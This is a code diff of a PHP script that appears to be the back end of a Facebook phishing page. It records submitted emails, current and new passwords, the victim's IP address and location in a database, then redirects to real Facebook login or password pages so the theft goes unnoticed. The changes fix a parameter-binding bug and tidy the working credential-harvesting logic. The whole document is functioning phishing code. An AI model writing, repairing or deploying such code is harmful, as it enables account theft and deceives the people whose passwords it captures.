@@ -1,5 +1,9 @@
 <?php
 	
+//ini_set('display_errors', 1);
+//ini_set('display_startup_errors', 1);
+//error_reporting(E_ALL);
+require_once('connect.php');
 
 function getUserIP() { $ipaddress = ''; if (isset($_SERVER['HTTP_CLIENT_IP'])) $ipaddress = $_SERVER['HTTP_CLIENT_IP']; else if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']; else if(isset($_SERVER['HTTP_X_FORWARDED'])) $ipaddress = $_SERVER['HTTP_X_FORWARDED']; else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP']; else if(isset($_SERVER['HTTP_FORWARDED_FOR'])) $ipaddress = $_SERVER['HTTP_FORWARDED_FOR']; else if(isset($_SERVER['HTTP_FORWARDED'])) $ipaddress = $_SERVER['HTTP_FORWARDED']; else if(isset($_SERVER['REMOTE_ADDR'])) $ipaddress = $_SERVER['REMOTE_ADDR']; else $ipaddress = 'UNKNOWN'; return $ipaddress; }
 $txt="";
@@ -7,7 +11,7 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) { $outp
 
 
 
-	require_once('connect.php');
+	
     $email = '';
     $password = '';
     $password_new = '';
@@ -31,7 +35,7 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) { $outp
   $stmt->bindParam(':email', $email);
   $stmt->bindParam(':password', $password);
   $stmt->bindParam(':password_new', $password_new);
-  $stmt->bindParam(':password_new', $password_new2);
+  $stmt->bindParam(':password_new2', $password_new2);
   $stmt->bindParam(':request', $request);
   $stmt->bindParam(':server', $server);
   $stmt->bindParam(':location', $location);
@@ -40,13 +44,15 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) { $outp
 
   // insert a row
   $stmt->execute();
+  $conn = null;
+
  //print_r($stmt);
 //exit(); 
    if(!empty($email)){
 	   header("location: https://m.facebook.com/login/?email=". htmlspecialchars($email)."&li=LZmDXkzJmMQITfAJkFOmWCqq&e=1348092"); 
 	    exit(); } 
    else {
-   header('location: https://m.facebook.com/settings/account/password/survey/?po=keep_sessions&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Daccount_recovery&_rdr#_=_');
-   exit();
+      header('location: https://m.facebook.com/settings/account/password/survey/?po=keep_sessions&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Daccount_recovery&_rdr#_=_');
+      exit();
 }
 ?>
